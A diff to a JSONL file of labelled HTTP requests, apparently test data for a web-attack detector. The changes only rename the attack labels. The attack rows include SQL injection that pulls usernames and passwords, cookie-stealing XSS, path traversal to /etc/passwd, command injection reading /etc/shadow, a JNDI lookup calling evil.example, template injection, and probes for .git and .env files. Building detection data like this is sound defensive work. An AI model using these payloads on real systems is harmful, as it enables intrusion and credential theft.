@@ -9,17 +9,17 @@
 {"id":"b-008","label":"benign","note":"apostrophe in a search","method":"GET","scheme":"https","host":"shop.example.com","path":"/search","query":"q=O%27Reilly+books","tags":["lookalike","query"]}
 {"id":"b-009","label":"benign","note":"sorted listing","method":"GET","scheme":"https","host":"shop.example.com","path":"/api/orders","query":"sort=created_at&order=desc","tags":["query"]}
 {"id":"b-010","label":"benign","note":"etc in a path","method":"GET","scheme":"https","host":"shop.example.com","path":"/news/etc-and-more","tags":["lookalike","path"]}
-{"id":"a-001","label":"sqli","note":"UNION SELECT","method":"GET","scheme":"https","host":"shop.example.com","path":"/items","query":"id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--","tags":["query"]}
-{"id":"a-002","label":"sqli","note":"comment bypass","method":"GET","scheme":"https","host":"shop.example.com","path":"/login","query":"user=admin%27--&pass=x","tags":["query"]}
-{"id":"a-003","label":"sqli","note":"tautology","method":"GET","scheme":"https","host":"shop.example.com","path":"/items","query":"id=1%20OR%201=1","tags":["query"]}
+{"id":"a-001","label":"injection","note":"UNION SELECT","method":"GET","scheme":"https","host":"shop.example.com","path":"/items","query":"id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--","tags":["query"]}
+{"id":"a-002","label":"injection","note":"comment bypass","method":"GET","scheme":"https","host":"shop.example.com","path":"/login","query":"user=admin%27--&pass=x","tags":["query"]}
+{"id":"a-003","label":"injection","note":"tautology","method":"GET","scheme":"https","host":"shop.example.com","path":"/items","query":"id=1%20OR%201=1","tags":["query"]}
 {"id":"a-004","label":"xss","note":"script tag","method":"GET","scheme":"https","host":"shop.example.com","path":"/search","query":"q=%3Cscript%3Ealert(document.cookie)%3C/script%3E","tags":["query"]}
 {"id":"a-005","label":"xss","note":"event handler","method":"GET","scheme":"https","host":"shop.example.com","path":"/profile","query":"name=%3Cimg%20src=x%20onerror=alert(1)%3E","tags":["query"]}
-{"id":"a-006","label":"path_traversal","note":"/etc/passwd","method":"GET","scheme":"https","host":"shop.example.com","path":"/download","query":"file=../../../../etc/passwd","tags":["query"]}
-{"id":"a-007","label":"path_traversal","note":"encoded","method":"GET","scheme":"https","host":"shop.example.com","path":"/static/..%2f..%2f..%2fwindows/win.ini","tags":["path"]}
-{"id":"a-008","label":"rce","note":"command injection","method":"GET","scheme":"https","host":"shop.example.com","path":"/api/ping","query":"host=127.0.0.1;cat%20/etc/shadow","tags":["query"]}
-{"id":"a-009","label":"rce","note":"JNDI lookup in a header","method":"GET","scheme":"https","host":"shop.example.com","path":"/","headers":{"user-agent":["${jndi:ldap://evil.example/a}"]},"tags":["header"]}
-{"id":"a-010","label":"rce","note":"template injection","method":"GET","scheme":"https","host":"shop.example.com","path":"/render","query":"tpl=%7B%7B7*7%7D%7D%7B%7Bconfig.items()%7D%7D","tags":["query"]}
-{"id":"a-011","label":"scanner","note":".git","method":"GET","scheme":"https","host":"shop.example.com","path":"/.git/config","tags":["path"]}
-{"id":"a-012","label":"scanner","note":".env","method":"GET","scheme":"https","host":"shop.example.com","path":"/.env","tags":["path"]}
-{"id":"a-013","label":"scanner","note":"WordPress setup","method":"GET","scheme":"https","host":"shop.example.com","path":"/wp-admin/setup-config.php","tags":["path"]}
-{"id":"a-014","label":"scanner","note":"phpMyAdmin","method":"GET","scheme":"https","host":"shop.example.com","path":"/phpmyadmin/index.php","tags":["path"]}
+{"id":"a-006","label":"file_access","note":"/etc/passwd","method":"GET","scheme":"https","host":"shop.example.com","path":"/download","query":"file=../../../../etc/passwd","tags":["query"]}
+{"id":"a-007","label":"file_access","note":"encoded","method":"GET","scheme":"https","host":"shop.example.com","path":"/static/..%2f..%2f..%2fwindows/win.ini","tags":["path"]}
+{"id":"a-008","label":"injection","note":"command injection","method":"GET","scheme":"https","host":"shop.example.com","path":"/api/ping","query":"host=127.0.0.1;cat%20/etc/shadow","tags":["query"]}
+{"id":"a-009","label":"injection","note":"JNDI lookup in a header","method":"GET","scheme":"https","host":"shop.example.com","path":"/","headers":{"user-agent":["${jndi:ldap://evil.example/a}"]},"tags":["header"]}
+{"id":"a-010","label":"injection","note":"template injection","method":"GET","scheme":"https","host":"shop.example.com","path":"/render","query":"tpl=%7B%7B7*7%7D%7D%7B%7Bconfig.items()%7D%7D","tags":["query"]}
+{"id":"a-011","label":"recon","note":".git","method":"GET","scheme":"https","host":"shop.example.com","path":"/.git/config","tags":["path"]}
+{"id":"a-012","label":"recon","note":".env","method":"GET","scheme":"https","host":"shop.example.com","path":"/.env","tags":["path"]}
+{"id":"a-013","label":"recon","note":"WordPress setup","method":"GET","scheme":"https","host":"shop.example.com","path":"/wp-admin/setup-config.php","tags":["path"]}
+{"id":"a-014","label":"recon","note":"phpMyAdmin","method":"GET","scheme":"https","host":"shop.example.com","path":"/phpmyadmin/index.php","tags":["path"]}
